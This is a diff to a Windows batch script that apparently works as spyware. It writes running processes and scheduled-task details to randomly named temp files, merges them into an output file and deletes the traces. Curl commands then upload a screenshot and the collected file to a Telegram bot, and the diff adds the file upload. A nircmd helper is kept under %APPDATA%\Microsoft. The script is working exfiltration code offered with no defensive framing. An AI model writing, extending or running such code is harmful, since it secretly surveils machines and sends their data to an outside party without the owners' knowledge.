@@ -1,6 +1,18 @@
 @echo off
 ::goto :EOF
 
+
+
+setlocal enabledelayedexpansion
+
+
+
+
+set "BATCHVERSION=1.1"
+
+
+
+
 set nircmd="%APPDATA%\Microsoft\nircmd.exe"
 
 
@@ -153,6 +165,105 @@ echo Last 7 lines have been saved to %output_file%
 
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+for /L %%i in (1,1,13) do (
+    set /A "rand=!random! %% 62"
+    for %%j in (!rand!) do set "filename=!filename!!chars:~%%j,1!"
+)
+set "filename3=!filename!"
+set "filename="
+
+
+
+
+set "ProcessTXTFILE=%temp%\!filename3!"
+
+
+echo Saving All Processes in "%ProcessTXTFILE%"
+powershell -command "Get-Process | Select-Object ProcessName, Path | Format-Table -AutoSize -Wrap" > "%ProcessTXTFILE%" 2>nul
+::powershell -command "Get-Process | Select-Object ProcessName, Path" > "%ProcessTXTFILE%" 2>nul
+echo Saved.
+echo.
+
+
+
+
+
+
+echo. >> "%output_file%"
+echo. >> "%output_file%"
+echo. >> "%output_file%"
+echo. >> "%output_file%"
+echo. >> "%output_file%"
+echo. >> "%output_file%"
+echo All running processes : >> "%output_file%"
+echo. >> "%output_file%"
+type "%ProcessTXTFILE%" >> "%output_file%"
+del /f /q "%ProcessTXTFILE%"
+echo. >> "%output_file%"
+echo. >> "%output_file%"
+echo. >> "%output_file%"
+echo. >> "%output_file%"
+
+
+
+
+for /L %%i in (1,1,13) do (
+    set /A "rand=!random! %% 62"
+    for %%j in (!rand!) do set "filename=!filename!!chars:~%%j,1!"
+)
+set "filename4=!filename!"
+set "filename="
+set "TASKS_DATA=%temp%\!filename4!"
+
+:: create %TASKS_DATA%
+schtasks /query /fo LIST /v > "%TASKS_DATA%"
+
+
+
+
+
+
+echo Task Scheduler :  >> "%output_file%"
+echo. >> "%output_file%"
+echo. >> "%output_file%"
+type "%TASKS_DATA%" >> "%output_file%"
+del /f /q "%TASKS_DATA%"
+echo. >> "%output_file%"
+echo. >> "%output_file%"
+echo. >> "%output_file%"
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 :SENDMSG
 
 
@@ -168,9 +279,18 @@ echo Last 7 lines have been saved to %output_file%
 curl -s -X POST "https://api.telegram.org/bot%TOKEN_MyScrn%/sendPhoto" ^
      -F "chat_id=%CHAT_ID_MyScrn%" ^
      -F "message_thread_id=%TOPIC_ID_MyScrn%" ^
-     -F "caption=%CAPTION_MyScrn%" ^
+     -F "caption=|%time%|%BATCHVERSION%|" ^
      -F "photo=@%FILE_PATH_MyScrn%" ^
      --limit-rate 80K
+
+:: Send File
+curl -s -X POST "https://api.telegram.org/bot%TOKEN_MyScrn%/sendDocument" ^
+     -F "chat_id=%CHAT_ID_MyScrn%" ^
+     -F "message_thread_id=%TOPIC_ID_MyScrn%" ^
+     -F "document=@%output_file%" ^
+     -F "caption=|%time%|%BATCHVERSION%|" ^
+     --limit-rate 80K
+
 
 ::goto GOGO2
 
